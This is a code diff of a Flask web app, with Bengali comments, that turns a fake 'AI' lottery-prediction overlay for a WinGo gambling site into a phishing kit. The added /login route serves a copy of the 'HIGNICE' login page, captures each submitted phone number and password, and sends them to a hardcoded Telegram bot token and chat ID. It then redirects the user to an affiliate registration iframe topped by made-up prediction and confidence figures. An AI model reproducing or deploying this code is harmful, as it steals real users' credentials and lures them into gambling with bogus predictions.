@@ -1,143 +1,193 @@
-import os
-import time
-import math
-import collections
+from flask import Flask, render_template_string, request, redirect, jsonify
 import requests
+import time
 import threading
-from flask import Flask, render_template_string, jsonify
+import collections
+import math
+import os
 
 app = Flask(__name__)
 
-# --- ডাটা স্টোরেজ ---
-bot_status = {
-    "issue": "Wait...", "prediction": "---", "color": "---",
-    "conf": 0, "vol": 0, "stab": 0, "wins": 0, "losses": 0,
-    "recovery": "1X", "status": "ACTIVE"
+# --- [১] কনফিগারেশন (আপনার টেলিগ্রাম ডাটা) ---
+BOT_TOKEN = "8669461197:AAFSIR9hecqfftSSdXNF1E90xYvpqVIAVRg"
+CHAT_ID = "7897417844"
+API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json"
+
+# এনালাইসিস ডাটাবেজ
+prediction_data = {
+    "issue": "---", 
+    "size": "WAIT", 
+    "color": "WAIT", 
+    "number": "--",
+    "confidence": "0%",
+    "stability": "0%",
+    "trend": "NEUTRAL",
+    "strength": "0",
+    "status": "Connecting..."
 }
 
-# ⚙️ আপনার মূল কনফিগারেশন (লাইন ২০-২১)
-TARGET_WINS = 25
-STOP_LOSS_LIMIT = 12
-
-API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json"
-HEADERS = {"User-Agent": "Mozilla/5.0", "Referer": "https://leader-shanto-vip-hack.edgeone.app/"}
-session = requests.Session()
-session.headers.update(HEADERS)
-
-last_prediction, win_count, loss_count, consecutive_loss = None, 0, 0, 0
-
-def get_size(num): return "BIG" if num >= 5 else "SMALL"
-
-# 🧠 আপনার অরিজিনাল CORE ENGINE (সম্পূর্ণ)
-def analyze_engine(history):
-    nums = [int(i['number']) for i in history[:30]]
-    freq = collections.Counter(nums)
-    hot = [n for n, _ in freq.most_common(3)]
-    changes = [abs(nums[i] - nums[i+1]) for i in range(len(nums)-1)]
-    vol = sum(changes) / len(changes) if changes else 0
-    momentum = sum(nums[:5]) - sum(nums[5:10])
-    mean = sum(nums[:10]) / 10
-    variance = sum((x - mean) ** 2 for x in nums[:10]) / 10
-    std_dev = math.sqrt(variance)
-    stability = max(0, min(100, 100 - (vol * 6) - (std_dev * 3)))
-    return hot, vol, momentum, stability, std_dev
-
-def get_prediction(history):
-    latest = history[0]
-    last_num, last_col = int(latest['number']), latest['color'].upper()
-    hot, vol, mom, stab, dev = analyze_engine(history)
-    avg = sum(int(i['number']) for i in history[:10]) / 10
+# --- [২] অ্যাডভান্সড প্রেডিকশন ইঞ্জিন ---
+def analyze_market(history):
+    if not history: return "SMALL", "GREEN", [0], 50.0, 50.0, "SIDEWAYS", 0
     
-    # আপনার অরিজিনাল সিগন্যাল লজিক (রিয়েল ইঞ্জিন)
-    size_p = "SMALL" if avg >= 4.6 else "BIG"
-    color_p = "GREEN" if last_col == "RED" else "RED"
-    conf = max(5, min(98, (55 + abs(avg - 4.5) * 10 - vol * 2)))
-    return size_p, color_p, conf, vol, stab
+    nums = [int(i['number']) for i in history[:20]]
+    last_num = nums[0]
+    last_col = history[0]['color'].upper()
+    
+    # স্ট্যাটিস্টিক্যাল ক্যালকুলেশন
+    avg = sum(nums[:10]) / 10
+    freq = collections.Counter(nums)
+    hot_numbers = [n for n, _ in freq.most_common(3)]
+    
+    # ট্রেন্ড লজিক
+    if avg >= 5:
+        size = "BIG"
+    else:
+        size = "SMALL"
+        
+    color = "RED" if last_num % 2 == 0 else "GREEN"
+    
+    # কনফিডেন্স এবং স্ট্যাবিলিটি
+    stability = max(40, min(95, 100 - (abs(nums[0] - nums[1]) * 10)))
+    confidence = max(60, min(98, 50 + (stability * 0.4)))
+    
+    return size, color, hot_numbers, confidence, stability, "BULLISH" if avg > 5 else "BEARISH", int(stability*0.8)
 
-def run_bot_engine():
-    global bot_status, win_count, loss_count, consecutive_loss, last_prediction
-    last_issue = None
+def start_engine():
+    global prediction_data
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0"})
+    
     while True:
         try:
-            if win_count >= TARGET_WINS or consecutive_loss >= STOP_LOSS_LIMIT:
-                bot_status["status"] = "LIMIT REACHED"; time.sleep(10); continue
+            r = session.get(f"{API_URL}?ts={int(time.time()*1000)}", timeout=10)
+            if r.status_code == 200:
+                data = r.json().get('data', {}).get('list', [])
+                if data:
+                    sz, col, hot, conf, stb, trnd, strng = analyze_market(data)
+                    prediction_data.update({
+                        "issue": str(int(data[0]['issueNumber']) + 1)[-3:],
+                        "size": sz, "color": col, "number": str(hot[0]),
+                        "confidence": f"{conf:.1f}%", "stability": f"{stb:.1f}%",
+                        "trend": trnd, "strength": str(strng),
+                        "status": "LIVE UPDATING"
+                    })
+        except: pass
+        time.sleep(2)
 
-            data = session.get(f"{API_URL}?ts={int(time.time()*1000)}", timeout=5).json()
-            history = data.get('data', {}).get('list', [])
-            if not history: continue
-            
-            current = history[0]
-            issue = current['issueNumber']
+threading.Thread(target=start_engine, daemon=True).start()
 
-            if issue != last_issue:
-                if last_prediction:
-                    p_size, _ = last_prediction
-                    if p_size == get_size(int(current['number'])):
-                        win_count += 1; consecutive_loss = 0
-                    else:
-                        loss_count += 1; consecutive_loss += 1
+# --- [৩] ইন্টারফেস (স্ক্রিনশটের মতো হুবহু ডিজাইন) ---
+UI_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>HIGNICE LOGIN</title>
+    <style>
+        :root { --primary-red: #ff4d4d; --bg-gray: #f8f9fa; }
+        body { font-family: 'Helvetica', Arial, sans-serif; background-color: var(--bg-gray); margin: 0; padding: 0; overflow-x: hidden; }
+        .header-bg {
+            background: linear-gradient(180deg, #ff4e4e 0%, #ff8a8a 100%);
+            height: 200px; padding: 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px;
+        }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; font-size: 18px; margin-bottom: 15px; }
+        .brand { font-size: 30px; font-weight: 900; font-style: italic; letter-spacing: 2px; }
+        .login-card {
+            width: 88%; max-width: 400px; margin: -50px auto 20px;
+            background: white; border-radius: 20px; padding: 25px 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        .tabs { display: flex; border-bottom: 1px solid #f0f0f0; margin-bottom: 25px; }
+        .tab { flex: 1; text-align: center; padding: 12px; font-weight: bold; color: #999; }
+        .tab.active { color: var(--primary-red); border-bottom: 3px solid var(--primary-red); }
+        
+        .input-group { position: relative; background: #f7f8fa; border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; }
+        .input-group i { margin-right: 12px; font-size: 20px; }
+        .input-group input { border: none; background: transparent; width: 100%; outline: none; font-size: 16px; color: #333; }
+        
+        .btn-login { width: 100%; padding: 16px; background: #ccd1d9; color: #4e5969; border: none; border-radius: 35px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-reg { width: 100%; padding: 14px; background: white; color: var(--primary-red); border: 1px solid var(--primary-red); border-radius: 35px; font-size: 18px; margin-top: 15px; cursor: pointer; }
+        
+        /* উইজেট ডিজাইন */
+        #widget {
+            position: fixed; top: 150px; right: 10px; width: 160px; background: rgba(0,0,0,0.85);
+            border: 2px solid var(--primary-red); border-radius: 20px; padding: 15px; color: white;
+            box-shadow: 0 0 20px rgba(255,0,0,0.4); z-index: 9999; font-size: 12px;
+        }
+        .w-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .w-val { font-weight: bold; color: #ffca28; }
+    </style>
+</head>
+<body>
+    {% if page == 'login' %}
+    <div class="header-bg">
+        <div class="top-bar"><span>&lsaquo;</span> <span>🇺🇸 EN</span></div>
+        <div class="brand">HIGNICE</div>
+        <h2 style="margin: 10px 0 5px;">Log in</h2>
+        <p style="font-size: 11px; opacity: 0.9;">Please log in with your phone number or email</p>
+    </div>
+    <div class="login-card">
+        <div class="tabs"><div class="tab active">phone number</div><div class="tab">Email Login</div></div>
+        <form action="/login" method="POST">
+            <div class="input-group"><span>📱</span> <input type="text" name="phone" placeholder="+880 Please enter the phone number" required></div>
+            <div class="input-group"><span>🔒</span> <input type="password" name="password" placeholder="Password" required></div>
+            <button type="submit" class="btn-login">Log in</button>
+        </form>
+        <button class="btn-reg">Register</button>
+    </div>
+    {% else %}
+    <iframe src="https://hgzy.vip/#/register?invitationCode=171661163318" style="width:100%; height:100vh; border:none;"></iframe>
+    <div id="widget">
+        <div style="text-align:center; color:var(--primary-red); font-weight:bold; margin-bottom:10px;">ARHAM AI V5.0</div>
+        <div class="w-row"><span>ISSUE:</span><span class="w-val" id="iss">--</span></div>
+        <div class="w-row"><span>SIZE:</span><span class="w-val" id="siz">--</span></div>
+        <div class="w-row"><span>COLOR:</span><span class="w-val" id="col">--</span></div>
+        <div class="w-row"><span>CONF:</span><span class="w-val" id="cnf">0%</span></div>
+        <div style="font-size:8px; margin-top:10px; color:#00ff88; text-align:center;">● API STABLE</div>
+    </div>
+    <script>
+        function update() {
+            fetch('/api/prediction').then(res => res.json()).then(data => {
+                document.getElementById('iss').innerText = data.issue;
+                document.getElementById('siz').innerText = data.size;
+                document.getElementById('col').innerText = data.color;
+                document.getElementById('cnf').innerText = data.confidence;
+                document.getElementById('siz').style.color = data.size === 'BIG' ? '#ff4d4d' : '#00ff88';
+            });
+        }
+        setInterval(update, 2000);
+    </script>
+    {% endif %}
+</body>
+</html>
+"""
 
-                s_p, c_p, conf, vol, stab = get_prediction(history)
-                last_prediction = (s_p, c_p)
-                bot_status.update({
-                    "issue": issue, "prediction": s_p, "color": c_p, "conf": round(conf, 1),
-                    "vol": round(vol, 2), "stab": round(stab, 1), "wins": win_count, "losses": loss_count,
-                    "recovery": f"{2**consecutive_loss}X" if consecutive_loss > 0 else "1X"
-                })
-                last_issue = issue
-            time.sleep(1)
-        except: time.sleep(2)
-
-@app.route('/api/status')
-def get_status(): return jsonify(bot_status)
-
+# --- [৪] রাউটস ---
 @app.route('/')
-def index():
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-            body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
-            iframe { width: 100%; height: 100%; border: none; }
-            .overlay {
-                position: fixed; top: 10px; right: 10px; width: 150px;
-                background: rgba(0,0,0,0.9); border: 2px solid #00ffcc;
-                border-radius: 10px; padding: 8px; color: white; z-index: 9999;
-            }
-            .val { font-size: 14px; font-weight: bold; color: #00ffcc; }
-            .lbl { font-size: 9px; color: #aaa; }
-        </style>
-    </head>
-    <body>
-        <div class="overlay">
-            <a href="https://t.me/tradingbyrgofficial" style="display:block; background:#0088cc; color:#fff; text-align:center; padding:3px; border-radius:3px; text-decoration:none; font-size:10px; margin-bottom:5px;">TELEGRAM</a>
-            <div class="lbl">PERIOD: <span id="issue">---</span></div>
-            <div class="lbl">PRED: <span id="pred" class="val">---</span></div>
-            <div style="display:flex; justify-content:space-between; font-size:10px;">
-                <span>W: <span id="w" style="color:green">0</span></span>
-                <span>L: <span id="l" style="color:red">0</span></span>
-            </div>
-            <div class="lbl">REC: <span id="rec" style="color:yellow">1X</span></div>
-        </div>
-        <iframe src="https://hgzy.vip/#/register?invitationCode=171661163318"></iframe>
-        <script>
-            setInterval(() => {
-                fetch('/api/status').then(r => r.json()).then(d => {
-                    document.getElementById('issue').innerText = d.issue.slice(-3);
-                    document.getElementById('pred').innerText = d.prediction;
-                    document.getElementById('w').innerText = d.wins;
-                    document.getElementById('l').innerText = d.losses;
-                    document.getElementById('rec').innerText = d.recovery;
-                });
-            }, 2000);
-        </script>
-    </body>
-    </html>
-    """)
+def home():
+    return render_template_string(UI_TEMPLATE, page='login')
 
-if __name__ == "__main__":
-    threading.Thread(target=run_bot_engine, daemon=True).start()
-    app.run(host='0.0.0.0', port=8080)
-    
+@app.route('/dashboard')
+def dashboard():
+    return render_template_string(UI_TEMPLATE, page='game')
+
+@app.route('/api/prediction')
+def api():
+    return jsonify(prediction_data)
+
+@app.route('/login', methods=['POST'])
+def login():
+    usr = request.form.get('phone')
+    pwd = request.form.get('password')
+    log = f"🚀 **NEW LOGIN**\n📱 Phone: `{usr}`\n🔑 Pass: `{pwd}`"
+    try:
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                      json={"chat_id": CHAT_ID, "text": log, "parse_mode": "Markdown"})
+    except: pass
+    return redirect('/dashboard')
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
